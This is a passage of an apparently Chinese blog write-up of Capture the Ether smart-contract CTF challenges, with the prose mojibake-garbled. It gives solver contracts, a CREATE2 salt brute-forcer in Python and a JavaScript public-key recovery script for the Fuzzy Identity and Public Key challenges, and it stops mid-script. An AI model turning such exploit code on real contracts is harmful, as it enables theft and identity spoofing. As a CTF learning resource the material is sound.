2*<em>256-24</em>60*60</p></li><li><p>å†è°ƒç”¨ä¸€æ¬¡ upsert(2, 0) , è°ƒç”¨å, queue.length = 2 &amp; head = 0</p></li><li><p>æœ€åå–å‡ºæ‰€æœ‰ balance <code>withdraw(2)</code></p></li></ol><p>step1:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png"></a></p><p>step: 2</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png"></a></p><p>ç„¶ååœ¨æ‰§è¡Œwithraw çš„æ—¶å€™å‘ç°å¤±è´¥äº†ï¼Œé€šè¿‡è°ƒè¯•ä»¥åŠæŸ¥é˜…èµ„æ–™å‘ç°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contributionçš„amountå€¼å¹¶ä¸æ˜¯æˆ‘ä»¬ä¼ é€’çš„msg.valueçš„å€¼ï¼Œåœ¨å…¶åŸºç¡€ä¸Šè¿˜åŠ äº†1.å¼€å§‹æˆ‘ä¹Ÿä¸å¤ªæ˜ç™½ï¼Œåæ¥debugå‘ç°åŸæ¥queue.lengthä¹Ÿæ˜¯msg.value+1ï¼Œå› ä¸ºäºŒè€…å…±ç”¨ä¸€å—å­˜å‚¨ï¼Œåº”è¯¥æ˜¯queue.lengthå¢åŠ æ—¶ä¹Ÿä¿®æ”¹äº†amountçš„å€¼ï¼Œè‡³äºæ­¤å¤„queue.lengthä¸ºä½•+1ï¼Œåˆ™æ˜¯å› ä¸ºqueue.pushæ“ä½œï¼Œå› ä¸ºå…¶åœ¨æœ€åæ‰§è¡Œå¢æ·»å¯¹è±¡çš„ä»»åŠ¡ï¼Œæ·»åŠ ä»¥åå®ƒä¼šå°†queue.lengthè¿›è¡Œ+1æ“ä½œ</span><br><span class="line"></span><br><span class="line">è¿™æ ·ä¸€åˆ‡å°±è§£é‡Šçš„é€šäº†ï¼Œå…³é”®å°±æ˜¯è¿™é‡Œamountè¿›è¡Œäº†+1ï¼Œæ‰€ä»¥åœ¨withdrawæ˜¯æ‰€ç»Ÿè®¡çš„totaläº‹å®ä¸Šæ˜¯å¤§äºåˆçº¦æ‰€æ‹¥æœ‰çš„balanceï¼Œæ‰€ä»¥transferæ— æ³•æ‰§è¡Œï¼Œè¿™ä¸€ç‚¹ç¡®å®æœ‰ç‚¹éš¾åˆ°æˆ‘äº†ï¼Œå¿…é¡»æƒ³ä¸ªåŠæ³•æŠµæ¶ˆè¿™ä¸€æ­¥+1çš„æ“ä½œ</span><br><span class="line"></span><br><span class="line">å¾ˆå¿«ï¼Œæˆ‘æ„è¯†åˆ°æˆ‘å¯ä»¥åˆ©ç”¨valueæ¥è¦†ç›–å·²æœ‰çš„contributionï¼Œæ—¢ç„¶å‘1 weiä¼šåŠ 1ï¼Œé‚£æˆ‘å‘ä¸¤æ¬¡ï¼Œè¿™æ ·å¾—åˆ°çš„amountå°±æ˜¯2ï¼Œä¹Ÿå°±æ˜¯æˆ‘å®é™…å‘é€çš„weiæ•°ç›®ï¼Œæ‰€ä»¥æŠŠä¸Šé¢é‚£ä¸¤æ­¥å†™å…¥æ“ä½œéƒ½æ”¹æˆ1 weiä¸‹çš„æ“ä½œå³å¯ ã€‚</span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒèµ„æ–™ï¼š</strong></p><p><a href="https://www.anquanke.com/post/id/153375#h3-11">capture the ether write up(warmup and Math) - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h2 id="Account"><a href="#Account" class="headerlink" title="Account"></a>Account</h2><h3 id="1-Fuzzy-identity"><a href="#1-Fuzzy-identity" class="headerlink" title="1. Fuzzy identity"></a>1. Fuzzy identity</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This contract can only be used by me (smarx). I donâ€™t trust myself to remember my private key, so Iâ€™ve made it so whatever address Iâ€™m using in the future will work:</p><ol><li>I always use a wallet contract that returns â€œsmarxâ€ if you ask itsÂ <code>name</code>.</li><li>Everything I write has bad code in it, so my address always includes the hex stringÂ <code>badc0de</code>.</li></ol><p>To complete this challenge, steal my identity!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IName &#123;</span><br><span class="line">    function name() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(isSmarx(msg.sender));</span><br><span class="line">        require(isBadCode(msg.sender));</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSmarx(address addr) internal view returns (bool) &#123;</span><br><span class="line">        return IName(addr).name() &#x3D;&#x3D; bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isBadCode(address _addr) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr &#x3D; bytes20(_addr);</span><br><span class="line">        bytes20 id &#x3D; hex&quot;000000000000000000000000000000000badc0de&quot;;</span><br><span class="line">        bytes20 mask &#x3D; hex&quot;000000000000000000000000000000000fffffff&quot;;</span><br><span class="line"></span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (addr &amp; mask &#x3D;&#x3D; id) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;&#x3D; 4;</span><br><span class="line">            id &lt;&lt;&#x3D; 4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=8wxBLq_C2KQ">Research Me Obsessively</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è¦æ±‚ï¼š</p><ol><li><code> IName(addr).name() == bytes32(&quot;smarx&quot;);</code></li><li>åœ°å€ä¸­è¦å­˜åœ¨  <code>badc0de</code></li></ol><p>é€šè¿‡æŸ¥é˜…èµ„æ–™å¯ä»¥çŸ¥é“ï¼š</p><p>å‚è€ƒé»„çš®ä¹¦å…¬å¼(81)ï¼Œéƒ¨ç½²åˆçº¦æ—¶ï¼Œç›®æ ‡åœ°å€æœ‰ä¸¤ç§è®¡ç®—æ–¹å¼ï¼Œåˆ†åˆ«ä¸ºÂ <code>CREATE</code>Â å’ŒÂ <code>CREATE2</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png"></a></p><p>æˆ‘ä»¬é€šè¿‡ <code>CREATE2</code> çˆ†ç ´saltè®¡ç®—åˆçº¦åœ°å€ï¼ŒåŒ…å«badc0deå³å¯</p><ol><li>éƒ¨ç½²æ”»å‡»åˆçº¦çš„éƒ¨ç½²åˆçº¦åˆ©ç”¨create2è·å–åŒ…å«ç‰¹å®šå­—ç¬¦çš„æ”»å‡»åˆçº¦åœ°å€</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.12;</span><br><span class="line">contract FuzzyIdentitySolverDeployer &#123;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code, uint256 salt) public</span><br><span class="line">returns(address) &#123;</span><br><span class="line"></span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line"></span><br><span class="line">          addr :&#x3D; create2(0, add(code, 0x20), mload(code), salt)</span><br><span class="line">          if iszero(extcodesize(addr)) &#123;</span><br><span class="line"></span><br><span class="line">            revert(0, 0)</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²ä¸Šè¿°åˆçº¦å¹¶è·å–åˆçº¦åœ°å€ï¼š </p><ol start="2"><li>ç¼–è¯‘æ”»å‡»åˆçº¦ä»£ç ï¼Œ å¹¶è·å–æ”»å‡»åˆçº¦ä»£ç çš„ bytecode</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IFuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function authenticate() external;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function name() public pure returns (bytes32) &#123;</span><br><span class="line"></span><br><span class="line">        return bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public &#123;</span><br><span class="line">        IFuzzyIdentityChallengeSolver(_addr).authenticate();</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;linkReferences&quot;</span>: &#123;&#125;,</span><br><span class="line"><span class="attr">&quot;object&quot;</span>: <span class="string">&quot;608060405234801561001057600080fd5b5061019a806100206000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610084575b600080fd5b34801561005d57600080fd5b506100666100c7565b60405180826000191660001916815260200191505060405180910390f35b34801561009057600080fd5b506100c5600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100ef565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b50505050505600a165627a7a723058208dfe2548775f3de8273867b8111a10cf9a9ad2fbde6b7c8d41ececc20f7367380029&quot;</span>,</span><br><span class="line"><span class="attr">&quot;opcodes&quot;</span>: <span class="string">&quot;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x84 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x66 PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xEF JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH32 0x736D617278000000000000000000000000000000000000000000000000000000 SWAP1 POP SWAP1 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x380C7A67 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x167 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 DUP14 INVALID 0x25 0x48 PUSH24 0x5F3DE8273867B8111A10CF9A9AD2FBDE6B7C8D41ECECC20F PUSH20 0x6738002900000000000000000000000000000000 &quot;</span>,</span><br><span class="line"><span class="attr">&quot;sourceMap&quot;</span>: <span class="string">&quot;107:239:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;107:239:0;;;;;;;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]è®¡ç®—æ”»å‡»åˆçº¦åœ°å€</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="comment"># CREATE2</span></span><br><span class="line"><span class="comment"># keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create2</span>(<span class="params">deployer, salt_hexstr, hashed_bytecode</span>):</span></span><br><span class="line">    addr_hexbytes = Web3.keccak(hexstr=(<span class="string">&#x27;ff&#x27;</span> + deployer + salt_hexstr +</span><br><span class="line">hashed_bytecode))</span><br><span class="line">    addr = Web3.toHex(addr_hexbytes)[<span class="number">-40</span>:]</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"><span class="comment"># expecting deployer=&#x27;aabbccdd&#x27; (20 bytes -&gt; 40 characters)</span></span><br><span class="line"><span class="comment"># salt = some decimal number</span></span><br><span class="line"><span class="comment"># bytecode = &#x27;aabbccddeeff...&#x27; (variable length)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2</span>(<span class="params">deployer, salt, bytecode</span>):</span></span><br><span class="line">    <span class="keyword">assert</span>(len(deployer) == <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">assert</span>(len(bytecode) % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">    salt_hexstr = hex(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2_search</span>(<span class="params">deployer, predicate, bytecode</span>):</span></span><br><span class="line">    salt = <span class="number">0</span></span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        salt += <span class="number">1</span></span><br><span class="line">        salt_hexstr = hex(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">        addr = _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line">        <span class="keyword">if</span> salt % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&#x27;.&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> predicate(addr):</span><br><span class="line">            print(<span class="string">f&quot;\nFound a match after <span class="subst">&#123;salt&#125;</span> attempts: <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">f&quot;Usage: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> deployer_addr &lt;salt |predicate&gt; bytecode&quot;</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">f&quot;When passing a salt value, this script prints theaddress of the newly deployed contract based on the deployer address andbytecode hash.&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE 42 602a60205260206020f3&quot;</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">f&quot;When passing a predicate, this script will search for a salt value such that the new address satisfies the predicate.&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE &#x27;lambda addr: \&quot;badc0de\&quot; inaddr.lower()&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Another predicate that may be useful: &#x27;lambda addr:addr.startswith(\&quot;0\&quot; * 8)&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    deployer_addr = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> deployer_addr.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        deployer_addr = deployer_addr[<span class="number">2</span>:]</span><br><span class="line">    bytecode = sys.argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        salt = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">        print(create2(deployer_addr, salt, bytecode))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        predicate = eval(sys.argv[<span class="number">2</span>])</span><br><span class="line">        create2_search(deployer_addr, predicate, bytecode)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><pre><code>é€šè¿‡è®¡ç®—å‡ºæ¥çš„åˆçº¦æ”»å‡»ç›®æ ‡åœ°å€</code></pre><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png"></a></p><h3 id="2-Public-Key"><a href="#2-Public-Key" class="headerlink" title="2. Public Key"></a>2. Public Key</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>Recall that an address is the last 20 bytes of the keccak-256 hash of the addressâ€™s public key.</p><p>To complete this challenge, find the public key for theÂ <code>owner</code>â€˜s account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PublicKeyChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate(bytes publicKey) public &#123;</span><br><span class="line">        require(address(keccak256(publicKey)) &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=Qp9JriLfH1w">Public Key Infrastructure</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®æä¾›æˆ‘ä»¬ä¸€ä¸ªåˆçº¦çš„åœ°å€ï¼Œè¦æ±‚æˆ‘ä»¬å¾—åˆ°è¯¥åœ°å€çš„å…¬é’¥ã€‚ è¿™é‡Œæ¶‰åŠåˆ°ä»¥å¤ªåŠçš„äº¤æ˜“ç­¾åç®—æ³•ã€‚å½“æˆ‘ä»¬çŸ¥é“ rã€sã€v å’Œ hashæ—¶æˆ‘ä»¬å¯ä»¥æ¢å¤å‡ºå…¬é’¥ã€‚</p><p>R ã€Sã€V å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•è·å¾—ï¼Œ é¦–å…ˆæ‰¾åˆ°ç”±è¿™ä¸ªè´¦æˆ·å‘èµ·çš„äº¤æ˜“ï¼Œç„¶åé€šè¿‡è„šæœ¬è®¡ç®—ï¼Œ å®Œæ•´è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethers = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/address/0x92b28647ae1f3264661f72fb2eb9625a89d88a31</span></span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/getRawTx?tx=0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb</span></span><br><span class="line">    <span class="keyword">const</span> tx = ethers.utils.parseTransaction(<span class="string">&#x27;0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;</span>);</span><br><span class="line">    <span class="comment">// console.log(tx.r)</span></span><br><span class="line">    <span class="comment">// console.log(tx.s)</span></span><br><span class="line">    <span class="comment">// console.log(tx.v)</span></span><br><span class="line">      <span class="comment">// code to recover the public key from https://ethereum.stackexchange.com/questions/78815/ethers-js-recover-public-key-from-contract-deployment-via-v-r-s-values</span></span><br><span class="line">    <span class="keyword">const</span> expandedSig = &#123;</span><br><span class="line">        r: tx.r,</span><br><span class="line">        s: tx.s,</span><br><span class="line">        v: tx.v </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> signature = ethers.utils.joinSignature(expandedSig);</span><br><span class="line">    <span class="keyword">const</span> txData = &#123;</span><br><span class="line">        gasPrice: tx.gasPrice,</span><br><span class="line">        gasLimit: tx.gasLimit,</span><br><span class="line">        value: tx.value,</span><br><span class="line">        nonce: tx.nonce,</span><br><span class="line">        data: tx.data,</span><br><span class="line">        chainId: tx.chainId,</span><br><span class="line">        to: tx.to <span class="comment">// you might need to include this if it&#x27;s a regular txand not simply a contract deployment</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> rsTx = <span class="keyword">await</span> ethers.utils.resolveProperties(txData);</span><br><span class="line">    <span class="keyword">const</span> raw = ethers.utils.serializeTransaction(rsTx); <span class="comment">// returns RLPencoded tx</span></span><br><span class="line">    <span class="keyword">const</span> msgHash = ethers.utils.keccak256(raw); <span class="comment">// as specified byECDSA</span></span><br><span class="line">    <span class="keyword">const</span> msgBytes = ethers.utils.arrayify(msgHash); <span class="comment">// create binaryhash</span></span><br><span class="line">    <span class="keyword">const</span> recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes,signature);</span><br><span class="line">    <span class="comment">// recoveredPubKey is uncompressed, so starts with 0x04</span></span><br><span class="line">    <span class="keyword">const</span> compressedPubKey =</span><br><span class="line">ethers.utils.arrayify(recoveredPubKey).slice(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// console.log(compressedPubKey)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> answerPubKeyHex =</span><br><span class="line">Buffer.from(compressedPubKey).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`0x<span class="subst">$&#123;answerPubKeyHex&#125;</span>`</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span 